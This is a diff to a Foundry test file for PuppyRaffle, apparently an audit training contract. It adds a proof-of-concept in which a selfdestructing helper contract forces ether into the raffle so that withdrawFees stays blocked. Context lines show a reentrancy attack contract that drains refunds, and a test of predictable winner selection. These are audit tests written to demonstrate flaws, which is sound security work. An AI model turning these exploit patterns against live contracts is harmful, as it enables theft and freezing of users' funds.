@@ -258,7 +258,8 @@ contract PuppyRaffleTest is Test {
 
         // `playersEntered` enters 4 users, so players.length is hardcoded here
         // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
-        uint256 expectedIndexWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
+        uint256 expectedIndexWinner =
+            uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
         address expectedWinner = puppyRaffle.players(expectedIndexWinner);
 
         puppyRaffle.selectWinner();
@@ -312,7 +313,7 @@ contract PuppyRaffleTest is Test {
 
         assertEq(uint256(puppyRaffle.totalFees()), uint256(0), "total fees should be 0 before entering the raffle");
         assertGt(expectedFee, type(uint64).max, "expected fee should be greater than the maximum value of uint64");
-        
+
         puppyRaffle.selectWinner();
 
         // Real result in uint64
@@ -321,9 +322,24 @@ contract PuppyRaffleTest is Test {
         console2.log("The expected total fees are    : ", expectedTotalFees);
         console2.log("The real total fees are        : ", uint256(realTotalFees));
         assertLt(uint256(realTotalFees), expectedTotalFees, "real total fees isn't minor than expected one");
-    
+
         // Withdraw function results in a block
-        assertTrue(address(puppyRaffle).balance != uint256(realTotalFees), "puppyRaffle balance shouldn't be equal to the real total fees");
+        assertTrue(
+            address(puppyRaffle).balance != uint256(realTotalFees),
+            "puppyRaffle balance shouldn't be equal to the real total fees"
+        );
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+    }
+
+    function test_StrictEqualityBlocks() public playersEntered {
+        SelfDestructiveContract selfDestructiveContract = new SelfDestructiveContract(puppyRaffle);
+        vm.deal(address(selfDestructiveContract), 1 wei);
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+        vm.roll(block.number + 1);
+
+        selfDestructiveContract.destroy();
+
         vm.expectRevert("PuppyRaffle: There are currently players active!");
         puppyRaffle.withdrawFees();
     }
@@ -346,7 +362,7 @@ contract PuppyRaffleTest is Test {
         console2.log("Final attacker balance    : ", finalAttackerBalance);
         console2.log("Final victim balance      : ", finalVictimBalance);
 
-        if(initialAttackerBalance < finalAttackerBalance) {
+        if (initialAttackerBalance < finalAttackerBalance) {
             console2.log("Reentrancy was successful!");
         } else {
             console2.log("Reentrancy failed");
@@ -376,8 +392,21 @@ contract ReentrancyContract {
     }
 
     receive() external payable {
-        if(address(puppyRaffle).balance >= entranceFee) {
+        if (address(puppyRaffle).balance >= entranceFee) {
             puppyRaffle.refund(attackerIndex);
         }
+    }
+}
+
+// This goes outside the PuppyRaffleTest contract
+contract SelfDestructiveContract {
+    PuppyRaffle puppyRaffle;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+    }
+
+    function destroy() external {
+        selfdestruct(payable(address(puppyRaffle)));
     }
 }
